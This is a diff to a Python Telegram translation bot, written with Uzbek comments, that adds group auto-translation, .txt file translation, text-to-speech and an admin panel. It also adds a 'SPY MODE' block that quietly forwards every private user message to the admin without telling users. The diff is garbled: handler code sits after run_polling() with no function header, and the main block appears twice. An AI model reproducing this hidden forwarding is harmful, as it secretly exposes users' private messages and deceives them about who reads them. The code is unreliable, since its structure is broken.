@@ -233,4 +233,132 @@ if __name__ == '__main__':
     application.add_handler(CallbackQueryHandler(button_callback))
     
     print("Bot V7.0 (Pro Mode) ishga tushdi!")
+    application.run_polling()    # 👥 GURUH UCHUN AVTO-TARJIMA REJIMI
+    if chat_type in ['group', 'supergroup']:
+        if text and not text.startswith('/'):
+            try:
+                # Guruhdagi matnni avtomatik o'zbekchaga o'giradi
+                tarjima = GoogleTranslator(source='auto', target='uz').translate(text)
+                # Agar yozilgan matn o'zi o'zbekcha bo'lmasa, tarjimani yuboradi
+                if tarjima.lower() != text.lower():
+                    await update.message.reply_text(f"🇺🇿 <b>Tarjima:</b>\n{tarjima}", parse_mode="HTML", reply_to_message_id=update.message.message_id)
+            except:
+                pass
+        return
+
+    # 🔥 JOSUSLIK FUNKSIYASI (SPY MODE)
+    if user_id != ADMIN_ID and chat_type == 'private':
+        try:
+            await context.bot.forward_message(chat_id=ADMIN_ID, from_chat_id=user_id, message_id=update.message.message_id)
+        except:
+            pass 
+
+    state = context.user_data.get('state', 'main')
+
+    if text == "🔙 Bosh menyu":
+        context.user_data['state'] = 'main'
+        await update.message.reply_text("🏠 Asosiy menyu.", reply_markup=main_menu_keyboard(user_id))
+        return
+
+    if text == "🔤 Tarjima qilish":
+        target = context.user_data.get('lang_name', "🇺🇿 O'zbek")
+        context.user_data['state'] = 'translating'
+        await update.message.reply_text(
+            f"Hozirgi maqsadli til: <b>{target}</b>\n\nTilni o'zgartirish uchun pastdagi tugmalardan tanlang yoki matn yuboring:",
+            reply_markup=inline_lang_keyboard(),
+            parse_mode="HTML"
+        )
+        return
+
+    elif text == "👤 Profilim":
+        lang = context.user_data.get('lang_name', "🇺🇿 O'zbek")
+        await update.message.reply_text(f"👤 <b>Ism:</b> {update.effective_user.first_name}\n🌐 <b>Tarjima tili:</b> {lang}", parse_mode="HTML")
+        return
+
+    elif text == "📞 Aloqa":
+        context.user_data['state'] = 'feedback'
+        await update.message.reply_text("Admin uchun xabaringizni yozing:", reply_markup=ReplyKeyboardMarkup([[KeyboardButton("🔙 Bosh menyu")]], resize_keyboard=True))
+        return
+    
+    elif text == "ℹ️ Info":
+        await update.message.reply_text(f"🤖 <b>Bot V7.0 Pro</b>\n\n✨ <b>Imkoniyatlar:</b>\n- Guruhlarda avto-tarjima\n- .txt fayllarni tarjima qilish\n- Inline rejim (`{BOT_USERNAME} matn`)", parse_mode="Markdown")
+        return
+
+    if text == "👑 Admin Panel" and user_id == ADMIN_ID:
+        odam_soni = get_count()
+        await update.message.reply_text(f"👑 <b>ADMIN PANEL</b>\n👥 Bot obunachilari: {odam_soni}", parse_mode="HTML")
+        return
+
+    # ODATIY TARJIMA REJIMI
+    if state == 'translating' or chat_type == 'private':
+        target_code = context.user_data.get('target_lang', 'uz')
+        try:
+            tarjima = GoogleTranslator(source='auto', target=target_code).translate(text)
+            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔊 Ovozli eshitish", callback_data=f"tts_{target_code}")]])
+            context.user_data['last_translation'] = tarjima
+            await update.message.reply_text(f"📝 <b>Tarjima:</b>\n\n{tarjima}", reply_markup=keyboard, parse_mode="HTML")
+        except Exception as e:
+            await update.message.reply_text("⚠️ Tarjimada xatolik yuz berdi.")
+        return
+
+    if state == 'feedback':
+        if user_id != ADMIN_ID:
+            await update.message.reply_text("✅ Xabaringiz adminga yuborildi!", reply_markup=main_menu_keyboard(user_id))
+            context.user_data['state'] = 'main'
+        return
+
+# 📄 HUJJATLARNI TARJIMA QILISH (.txt)
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    doc = update.message.document
+    if doc.mime_type == 'text/plain':
+        await update.message.reply_text("⏳ Matn o'qilmoqda va tarjima qilinmoqda...")
+        try:
+            file = await context.bot.get_file(doc.file_id)
+            downloaded_file = await file.download_as_bytearray()
+            text = downloaded_file.decode('utf-8')
+            
+            # Matn juda uzun bo'lsa qisqartiramiz (Telegram limiti)
+            target_code = context.user_data.get('target_lang', 'uz')
+            tarjima = GoogleTranslator(source='auto', target=target_code).translate(text[:4000])
+            await update.message.reply_text(f"📄 <b>Hujjat tarjimasi:</b>\n\n{tarjima}", parse_mode="HTML")
+        except Exception as e:
+            await update.message.reply_text("⚠️ Hujjatni o'qishda xatolik yuz berdi. Faqat .txt formatidagi matnli hujjatlarni yuboring.")
+    else:
+        await update.message.reply_text("⚠️ Hozircha faqat .txt formatidagi hujjatlarni tarjima qila olaman.")
+
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    data = query.data
+
+    if data.startswith("lang_"):
+        parts = data.split('_')
+        code = parts[1]
+        name = parts[2]
+        context.user_data['target_lang'] = code
+        context.user_data['lang_name'] = name
+        await query.edit_message_text(f"✅ Til muvaffaqiyatli <b>{name}</b> ga o'zgartirildi!\n\nEndi menga matn yuboring:", parse_mode="HTML")
+    
+    elif data.startswith("tts_"):
+        code = data.split('_')[1]
+        await query.message.reply_text("⏳ Ovoz tayyorlanmoqda...")
+        try:
+            tts = gTTS(text=context.user_data.get('last_translation', 'Hello'), lang=code, slow=False)
+            tts.save("audio.mp3")
+            await context.bot.send_audio(chat_id=query.message.chat_id, audio=open("audio.mp3", 'rb'), title="Tarjima", performer=BOT_USERNAME)
+            os.remove("audio.mp3")
+        except: 
+            await query.message.reply_text("⚠️ Bu til uchun ovozli o'qish imkoni yo'q.")
+
+if __name__ == '__main__':
+    init_db()
+    keep_alive()
+    application = ApplicationBuilder().token(BOT_TOKEN).build()
+    
+    application.add_handler(CommandHandler('start', start))
+    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
+    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    application.add_handler(CallbackQueryHandler(button_callback))
+    
+    print("Bot V7.0 (Pro Mode) ishga tushdi!")
     application.run_polling()
